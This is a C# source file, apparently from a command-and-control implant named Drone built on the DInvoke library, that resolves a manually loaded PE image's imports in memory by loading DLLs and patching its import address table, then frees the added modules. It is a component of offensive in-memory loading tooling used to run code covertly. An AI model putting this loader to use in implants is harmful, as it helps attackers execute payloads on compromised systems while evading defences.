using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using Drone.Interop;

namespace Drone.Utilities;

public sealed class ImportResolver
{
    private const int IDT_SINGLE_ENTRY_LENGTH = 20;
    private const int IDT_IAT_OFFSET = 16;
    private const int IDT_DLL_NAME_OFFSET = 12;
    private const int ILT_HINT_LENGTH = 2;

    private readonly List<string> _originalModules = new();

    public void ResolveImports(PELoader pe, long currentBase)
    {
        // Save the current loaded modules so can unload new ones afterwards
        using var currentProcess = Process.GetCurrentProcess();
        foreach (ProcessModule module in currentProcess.Modules)
            _originalModules.Add(module.ModuleName);

        // Resolve Imports
        var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
        var dllIterator = 0;
        
        while (true)
        {
            var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);

            var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
            var pIAT = (IntPtr)(currentBase + iatRVA);

            var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
            var pDLLName = (IntPtr)(currentBase + dllNameRVA);
            var dllName = Marshal.PtrToStringAnsi(pDLLName);

            if (string.IsNullOrWhiteSpace(dllName))
                break;

            var handle = Generic.GetLoadedModuleAddress(dllName);
            
            if (handle == IntPtr.Zero)
                handle = Generic.LoadModuleFromDisk(dllName);

            if (handle == IntPtr.Zero)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            var pCurrentIATEntry = pIAT;
            
            while (true)
            {
                var pDLLFuncName = (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) + ILT_HINT_LENGTH);
                var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);

                if (string.IsNullOrWhiteSpace(dllFuncName))
                    break;

                var pRealFunction = Generic.GetNativeExportAddress(handle, dllFuncName);
                
                if (pRealFunction == IntPtr.Zero)
                    throw new Exception($"Unable to find procedure {dllName}!{dllFuncName}");

                Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());

                pCurrentIATEntry = (IntPtr)(pCurrentIATEntry.ToInt64() + IntPtr.Size);
            }

            dllIterator++;
        }

    }

    public void ResetImports()
    {
        using var currentProcess = Process.GetCurrentProcess();
        foreach (ProcessModule module in currentProcess.Modules)
        {
            if (_originalModules.Contains(module.ModuleName))
                continue;

            Methods.FreeLibrary(module.BaseAddress);
        }
    }
}